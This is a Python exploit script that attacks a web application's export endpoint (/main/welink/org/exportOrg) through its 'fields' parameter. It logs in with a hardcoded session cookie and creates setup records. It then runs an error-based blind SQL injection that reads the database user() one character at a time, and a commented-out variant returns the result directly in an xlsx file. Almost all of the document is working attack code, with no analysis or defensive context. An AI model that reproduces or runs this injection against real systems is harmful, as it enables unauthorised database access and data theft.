import requests, random, string

url = 'http://localhost:9999'
target = 'user()'
EBRIDGE_JSESSIONID = 'C14601114B599DF72EBDE50C461E5D69'

id = random.random()

cookies = {
    'EBRIDGE_JSESSIONID': EBRIDGE_JSESSIONID,
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'EBRIDGE_JSESSIONID=E4683662D7F592F9687B72E195F06056',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76',
}

# set sysapp, so we can input syscorp

data = {
    # 'appInfo.xxx': '123',
}

response = requests.post(f'{url}/main/lanxin/save?operation=1', cookies=cookies, headers=headers, data=data)
sysAppId = response.json()['sysAppId']

# wx_cp_corpinfo

data = {
    'corpInfo.id': id,
    'corpInfo.cptype': '123456'
}

response = requests.post(f'{url}/main/cp/save', cookies=cookies, headers=headers, data=data)

# wx_cp_userinfo

data = {
    'syscorpid': id,
    'cpuser.id': '123456',
    'cpuser.wxuserid': '123456',
    'cpuser.name': '123456',
    'cpuser.email': '123456'
}

response = requests.post(f'{url}/main/welink/org/saveUser?sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)

# sql injection 直接返回版

# data = {
#     'fields': f'concat("","",({target}),"") as "\\"\\""'
# }

# response = requests.post(f'{url}/main/welink/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)

# with open('test.xlsx', 'wb') as f:
#     f.write(response.content)

# sql injection 报错注入版

for i in range(0,100):
    data = {
        'fields': f'if(length({target})={i},cot(0),1)'
    }
    response = requests.post(f'{url}/main/welink/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
    if 'error' in response.text:
        length = i
        break

res = ""
for i in range(length):
    for c in string.printable:
        data = {
            'fields': f'if(ord(substr({target},{i+1},1))={ord(c)},cot(0),1)'
        }
        response = requests.post(f'{url}/main/welink/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
        if 'error' in response.text:
            res += c
            print(res)
            break